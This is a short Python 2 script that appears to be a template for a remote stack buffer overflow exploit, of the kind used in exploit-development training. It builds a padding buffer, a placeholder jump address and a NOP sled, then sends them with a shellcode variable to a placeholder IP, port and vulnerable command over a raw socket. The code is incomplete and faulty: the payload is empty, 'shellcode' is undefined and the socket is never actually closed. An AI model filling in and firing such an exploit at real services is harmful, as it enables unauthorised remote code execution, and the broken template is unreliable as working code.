import sys, socket

overflow = ("")

buffer = "A" * 100 + "offset of jmp address" +"\x90" * 32 +  overflow

try: 
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('ip',port))

		s.send(('vuln cmd' + buffer + shellcode))
		s.close

except:
		print  "error connecting to the server"
		sys.exit()

